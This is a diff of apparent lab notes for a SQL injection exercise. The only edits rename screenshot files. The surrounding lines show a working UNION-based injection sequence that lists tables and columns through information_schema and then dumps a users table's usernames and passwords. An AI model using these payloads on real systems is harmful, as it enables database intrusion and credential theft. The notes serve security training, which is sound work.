@@ -24,7 +24,7 @@ try:
 'UNION SELECT table_name, NULL FROM information_schema.tables--
 
 -> chose: user_tquduo
-![alt text](image.png)
+![alt text](lab14-1.png)
 
 try:
 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_tquduo'--
@@ -35,4 +35,4 @@ try:
 'UNION SELECT username_qqywkt,password_ztvoaa FROM users_tquduo--
 
 -> Result:
-![alt text](image-1.png)
+![alt text](lab14-2.png)
